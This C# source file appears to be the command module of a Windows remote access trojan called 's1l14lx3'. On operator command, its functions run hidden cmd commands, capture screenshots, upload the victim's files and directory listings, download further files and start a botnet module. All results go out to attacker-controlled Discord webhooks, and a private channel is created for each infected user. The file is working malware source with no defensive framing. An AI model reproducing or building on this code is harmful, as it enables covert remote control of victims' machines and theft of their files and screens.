using Microsoft.Win32;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Linq;

namespace s1l14lx3
{

    public class S1l14lx3_Module
    {
        static string Dir = Directory.GetCurrentDirectory();
        //command module
        public static async void WCP(object Obj)
        {
            try
            {
                string[] CMD = (string[])Obj;
                string response = "";
                if (CMD[2] == "-1")
                {
                    byte[] InfmessageBytes = Encoding.UTF8.GetBytes("Inf WCP");
                    S1l14lx3.networkStream.Write(InfmessageBytes, 0, InfmessageBytes.Length);
                }
                for (int Roop = 1;Roop <= int.Parse(CMD[2]);Roop++)
                {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = "cmd";
                    psi.Arguments = "/c " + CMD[1];
                    psi.RedirectStandardOutput = true;
                    psi.RedirectStandardError = true;
                    psi.UseShellExecute = false;
                    psi.CreateNoWindow = true;
                    Process process = new Process();
                    process.StartInfo = psi;
                    process.Start();
                    var SOutput = process.StandardOutput.ReadToEnd();
                    var SError = process.StandardError.ReadToEnd();
                    response += $"# WCP\\n```Exit Code : {process.ExitCode}\\nStandardOutput :\\n{SOutput}\\nStandardError :\\n{SError}\\n```\\n";
                }
                byte[] messageBytes = Encoding.UTF8.GetBytes(response);
                S1l14lx3.networkStream.Write(messageBytes, 0, messageBytes.Length);
                await WEBHOOK_POST($"{response}");
            }
            catch (Exception ex)
            {
                await WEBHOOK_POST("# WCP");
                await WEBHOOK_POST($"System Error\\n```{ex.Message}```");
            }
        }
        public static async void SCC(object Obj)
        {
            try
            {
                string[] CMD = (string[])Obj;
                string response = "";
                if (CMD[2] == "-1")
                {
                    byte[] InfmessageBytes = Encoding.UTF8.GetBytes("Inf SCC");
                    S1l14lx3.networkStream.Write(InfmessageBytes, 0, InfmessageBytes.Length);
                }
                for (int Roop = (int.Parse(CMD[2]) >= 1 ? 0 : 0); (int.Parse(CMD[2]) >= 1 ? Roop < int.Parse(CMD[2]) : true); Roop++)
                {
                    Process p = Process.Start(Dir + @"\SCC.exe");
                    p.WaitForExit();
                    await WEBHOOK_POST("# SCC");
                    await WEBHOOK_IMG_POST(@"C:\Windows\Temp\TSCS");
                }
                byte[] messageBytes = Encoding.UTF8.GetBytes("Captured");
                S1l14lx3.networkStream.Write(messageBytes, 0, messageBytes.Length);
            }
            catch (Exception ex)
            {
                await WEBHOOK_POST("# SCC");
                await WEBHOOK_POST($"System Error\\n```{ex.Message}```");
            }
        }
        public static async void UPLOAD(object Obj)
        {
            try
            {
                string[] CMD = (string[])Obj;
                string response = "";
                if (CMD[2] == "-1")
                {
                    byte[] InfmessageBytes = Encoding.UTF8.GetBytes("Inf UPLOAD");
                    S1l14lx3.networkStream.Write(InfmessageBytes, 0, InfmessageBytes.Length);
                }
                for (int Roop = (int.Parse(CMD[2]) >= 1 ? 0 : 0); (int.Parse(CMD[2]) >= 1 ? Roop < int.Parse(CMD[2]) : true); Roop++)
                {
                    await WEBHOOK_POST("# UPLOAD");
                    await WEBHOOK_FILE_POST(CMD[1]);
                }
                byte[] messageBytes = Encoding.UTF8.GetBytes("Uploaded");
                S1l14lx3.networkStream.Write(messageBytes, 0, messageBytes.Length);
            }
            catch (Exception ex)
            {
                await WEBHOOK_POST("# UPLOAD");
                await WEBHOOK_POST($"System Error\\n```{ex.Message}```");
            }
        }
        public static async void DOWNLOAD(object Obj)
        {
            try
            {
                string[] CMD = (string[])Obj;
                string response = "";
                if (CMD[2] == "-1")
                {
                    byte[] InfmessageBytes = Encoding.UTF8.GetBytes("Inf DOWNLOAD");
                    S1l14lx3.networkStream.Write(InfmessageBytes, 0, InfmessageBytes.Length);
                }
                for (int Roop = (int.Parse(CMD[2]) >= 1 ? 0 : 0); (int.Parse(CMD[2]) >= 1 ? Roop < int.Parse(CMD[2]) : true); Roop++)
                {
                    string[] raw = CMD[1].Split(" ");
                    string FileURL = raw[0];
                    string Filepath = raw[1];
                    FILE_GET(FileURL, Filepath);
                    await WEBHOOK_POST("# DOWNLOAD");
                    await WEBHOOK_POST("ダウンロードが完了しました\\n" + Filepath);
                }
                byte[] messageBytes = Encoding.UTF8.GetBytes("Downloaded");
                S1l14lx3.networkStream.Write(messageBytes, 0, messageBytes.Length);
            }
            catch (Exception ex)
            {
                await WEBHOOK_POST("# DOWNLOAD");
                await WEBHOOK_POST($"System Error\\n```{ex.Message}```");
            }
        }
        public static async void DFL(object Obj)
        {
            try
            {
                string[] CMD = (string[])Obj;
                string response = "";
                if (CMD[2] == "-1")
                {
                    byte[] InfmessageBytes = Encoding.UTF8.GetBytes("Inf DFL");
                    S1l14lx3.networkStream.Write(InfmessageBytes, 0, InfmessageBytes.Length);
                }
                for (int Roop = (int.Parse(CMD[2]) >= 1 ? 0 : 0); (int.Parse(CMD[2]) >= 1 ? Roop < int.Parse(CMD[2]) : true); Roop++)
                {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = "cmd";
                    psi.Arguments = "/c dir " + CMD[1];
                    psi.RedirectStandardOutput = true;
                    psi.RedirectStandardError = true;
                    psi.UseShellExecute = false;
                    psi.CreateNoWindow = true;
                    Process process = new Process();
                    process.StartInfo = psi;
                    process.Start();
                    var SOutput = process.StandardOutput.ReadToEnd();
                    await WEBHOOK_POST($"# DFL\\n```{SOutput}```");
                }
                byte[] messageBytes = Encoding.UTF8.GetBytes($"Check channel\nhttps://discord.com/channels/{Import.GUILDID}/{Import.ChannelID}");
                S1l14lx3.networkStream.Write(messageBytes, 0, messageBytes.Length);
            }
            catch (Exception ex)
            {
                await WEBHOOK_POST("# DFL");
                await WEBHOOK_POST($"System Error\\n```{ex.Message}```");
            }
        }
        public static async void TOAST(object Obj)
        {
            try
            {
                string[] CMD = (string[])Obj;
                string response = "";
                if (CMD[2] == "-1")
                {
                    byte[] InfmessageBytes = Encoding.UTF8.GetBytes("Inf TOAST");
                    S1l14lx3.networkStream.Write(InfmessageBytes, 0, InfmessageBytes.Length);
                }
                for (int Roop = (int.Parse(CMD[2]) >= 1 ? 0 : 0); (int.Parse(CMD[2]) >= 1 ? Roop < int.Parse(CMD[2]) : true); Roop++)
                {
                    Tools.ShowToast(CMD[1]);
                    await WEBHOOK_POST("# TOAST\\nToast showed");
                }
                byte[] messageBytes = Encoding.UTF8.GetBytes($"Toast showed");
                S1l14lx3.networkStream.Write(messageBytes, 0, messageBytes.Length);
            }
            catch (Exception ex)
            {
                await WEBHOOK_POST("# TOAST");
                await WEBHOOK_POST($"System Error\\n```{ex.Message}```");
            }
        }
        public static async void BEEP(object Obj)
        {
            try
            {
                string[] CMD = (string[])Obj;
                string response = "";
                if (CMD[2] == "-1")
                {
                    byte[] InfmessageBytes = Encoding.UTF8.GetBytes("Inf TOAST");
                    S1l14lx3.networkStream.Write(InfmessageBytes, 0, InfmessageBytes.Length);
                }
                for (int Roop = (int.Parse(CMD[2]) >= 1 ? 0 : 0); (int.Parse(CMD[2]) >= 1 ? Roop < int.Parse(CMD[2]) : true); Roop++)
                {
                    string[] Opt = CMD[1].Split(' ');
                    Console.Beep(int.Parse(Opt[0]), int.Parse(Opt[1]));
                }
                byte[] messageBytes = Encoding.UTF8.GetBytes($"Beep");
                S1l14lx3.networkStream.Write(messageBytes, 0, messageBytes.Length);
            }
            catch (Exception ex)
            {
                await WEBHOOK_POST($"System Error\n```{ex.Message}```");
            }
        }
        public static async void BNMs(object Obj)
        {
            try
            {
                string[] CMD = (string[])Obj;
                await WEBHOOK_POST($"BotNetを起動しました");
                byte[] messageBytes = Encoding.UTF8.GetBytes($"BotNetModule started");
                S1l14lx3.networkStream.Write(messageBytes, 0, messageBytes.Length);
                BNM.Start();
            }
            catch (Exception ex)
            {
                await WEBHOOK_POST($"System Error\n```{ex.Message}```");
            }
        }
        public static void CONSOLE(object Obj)
        {
            //ngrok new port
            //没
        }
        //end
        public static string GETID()
        {
            try
            {
                using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("s1l14lx3"))
                {
                    object value = key.GetValue("ID");
                    if (value == null)
                    {
                        return "Error";
                    }
                    return value.ToString();
                }
            }
            catch
            {
                return "Error";
            }
        }
        public static string GETWH()
        {
            try
            {
                using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("s1l14lx3"))
                {
                    object value = key.GetValue("Webhook");
                    if (value == null)
                    {
                        return "Error";
                    }
                    return value.ToString();
                }
            }
            catch
            {
                return "Error";
            }
        }
        public static string GETCID()
        {
            try
            {
                using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("s1l14lx3"))
                {
                    object value = key.GetValue("cID");
                    if (value == null)
                    {
                        return "Error";
                    }
                    return value.ToString();
                }
            }
            catch
            {
                return "Error";
            }
        }
        public static async Task<string> FILE_POST(string filepath)
        {
            using (var con = new MultipartFormDataContent())
            {
                HttpClient client = new HttpClient();
                byte[] fileBytes = File.ReadAllBytes(filepath);
                con.Add(new ByteArrayContent(fileBytes), "file", Path.GetFileName(filepath));
                HttpResponseMessage response = await client.PostAsync(new Uri(Import.Webhook), con);
                return await response.Content.ReadAsStringAsync();
            }
        }
        public static async Task<string> ALLLOG_POST(string Data)
        {
            try
            {
                string cnt;
                using (HttpClient httpClient = new HttpClient())
                {
                    StringContent content = new StringContent($"s1l14lx3:alllog:{Data}", Encoding.UTF8, "text/plain");
                    HttpResponseMessage response = await httpClient.PostAsync("", content);
                    cnt = await response.Content.ReadAsStringAsync();
                }
                return cnt;
            }
            catch
            {
                return "Error";
            }
        }
        public static async Task<string> MAINWEBHOOK_POST(string Data)
        {
            try
            {
                HttpClient httpClient = new HttpClient();
                string payload = "{\"content\": \"" + Data + "\",\"username\": \"s1l14lx3 Bot\",\"avatar_url\": \"https://cdn.discordapp.com/avatars/1215202457559240764/967ea3a5bfcc6120b76c9af7bf8768c5.webp?size=256\"}";
                var content = new StringContent(payload, Encoding.UTF8, "application/json");
                HttpResponseMessage response = await httpClient.PostAsync(Import.MainChannelWebhook, content);
                string res = await response.Content.ReadAsStringAsync();
                return res;
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
        public static async Task<string> WEBHOOK_POST(string Data)
        {
            try
            {
                HttpClient httpClient = new HttpClient();
                string payload = "{\"content\": \"" + Data + "\",\"username\": \"s1l14lx3 Bot\",\"avatar_url\": \"https://cdn.discordapp.com/avatars/1215202457559240764/967ea3a5bfcc6120b76c9af7bf8768c5.webp?size=256\"}";
                var content = new StringContent(payload, Encoding.UTF8, "application/json");
                HttpResponseMessage response = await httpClient.PostAsync(Import.Webhook, content);
                string res = await response.Content.ReadAsStringAsync();
                return res;
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
        public static async Task<string> WEBHOOK_POST(string Data, string Name)
        {
            try
            {
                HttpClient httpClient = new HttpClient();
                string payload = "{\"content\": \"" + Data + "\",\"username\": \"" + Name + "\",\"avatar_url\": \"https://cdn.discordapp.com/avatars/1215202457559240764/967ea3a5bfcc6120b76c9af7bf8768c5.webp?size=256\"}";
                var content = new StringContent(payload, Encoding.UTF8, "application/json");
                HttpResponseMessage response = await httpClient.PostAsync(Import.Webhook, content);
                string res = await response.Content.ReadAsStringAsync();
                return res;
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
        public static async Task<string> WEBHOOK_FILE_POST(string FilePath)
        {
            try
            {
                HttpClient httpClient = new HttpClient();
                var content = new MultipartFormDataContent();
                HttpClient client = new HttpClient();
                byte[] fileBytes = File.ReadAllBytes(FilePath);
                content.Add(new ByteArrayContent(fileBytes), Path.GetExtension(FilePath), Path.GetFileName(FilePath));
                content.Add(new StringContent("s1l14lx3 Bot"), "username");
                content.Add(new StringContent("https://cdn.discordapp.com/avatars/1215202457559240764/967ea3a5bfcc6120b76c9af7bf8768c5.webp?size=256"), "avatar_url");
                HttpResponseMessage response = await httpClient.PostAsync(Import.Webhook, content);
                string res = await response.Content.ReadAsStringAsync();
                return res;
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
        public static async Task<string> WEBHOOK_IMG_POST(string FilePath)
        {
            try
            {
                HttpClient httpClient = new HttpClient();
                var content = new MultipartFormDataContent();
                HttpClient client = new HttpClient();
                byte[] fileBytes = File.ReadAllBytes(FilePath);
                content.Add(new ByteArrayContent(fileBytes), "png", "Screenshot.png");
                content.Add(new StringContent("s1l14lx3 Bot"), "username");
                content.Add(new StringContent("https://cdn.discordapp.com/avatars/1215202457559240764/967ea3a5bfcc6120b76c9af7bf8768c5.webp?size=256"), "avatar_url");
                HttpResponseMessage response = await httpClient.PostAsync(Import.Webhook, content);
                string res = await response.Content.ReadAsStringAsync();
                return res;
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
        public static string FILE_GET(string URL, string Filepath)
        {
            try
            {
                WebClient wc = new WebClient();
                wc.DownloadFile(URL, Filepath);
                wc.Dispose();
                return "Succes";
            }
            catch (Exception ex)
            {
                return "Error : " + ex.Message;
            }
        }
        public static string GET(string URL)
        {
            try
            {
                using (HttpClient httpClient = new HttpClient())
                {
                    WebClient web = new WebClient();
                    string raw = web.DownloadString(URL);
                    string contentType = web.ResponseHeaders["Content-Type"];
                    bool isTextPlain = contentType != null && contentType.StartsWith("text/plain");
                    if (!isTextPlain)
                    {
                        raw = "Error";
                    }
                    return raw;
                }
            }
            catch
            {
                return "Error";
            }
        }
        public static async Task<string> ChannelCreate()
        {
            string apiUrl = $"https://discord.com/api/v9/guilds/{Import.GUILDID}/channels";
            HttpClient httpClient = new HttpClient();
            string Permissons = "{\"id\": \"" + Import.PARENTUSERID + "\",\"type\": 1,\"allow\": \"1024\",\"deny\": \"0\"},{\"id\": \"" + Import.GUILDID + "\",\"type\": 1,\"allow\": \"0\",\"deny\": \"1024\"}";
            if (Import.PARENTUSERID == "" || Import.PARENTUSERID == null)
            {
                Permissons = "";
            }
            string payload = "{\"id\": \"" + Import.GUILDID + "\",\"type\": 0,\"last_message_id\": null,\"flags\": 0,\"guild_id\": \"" + Import.GUILDID + "\",\"name\": \"User-" + Import.ID + "\",\"parent_id\": null,\"rate_limit_per_user\": 0,\"topic\": null,\"position\": 1,\"permission_overwrites\": [" + Permissons + "],\"nsfw\": false}";
            Console.WriteLine(payload);
            httpClient.DefaultRequestHeaders.Add("Authorization", $"Bot {Import.DISCORDTOKEN}");
            var content = new StringContent(payload, Encoding.UTF8, "application/json");
            HttpResponseMessage response = await httpClient.PostAsync(apiUrl, content);
            string res = await response.Content.ReadAsStringAsync();
            return res;
        }
        public static async Task<string> WebhookCreate()
        {
            string apiUrl = $"https://discord.com/api/v9/channels/{Import.ChannelID}/webhooks";
            HttpClient httpClient = new HttpClient();
            string payload = "{\"name\": \"s1l14lx3 Bot\"}";
            httpClient.DefaultRequestHeaders.Add("Authorization", $"Bot {Import.DISCORDTOKEN}");
            var content = new StringContent(payload, Encoding.UTF8, "application/json");
            HttpResponseMessage response = await httpClient.PostAsync(apiUrl, content);
            string res = await response.Content.ReadAsStringAsync();
            return res;
        }
    }

}
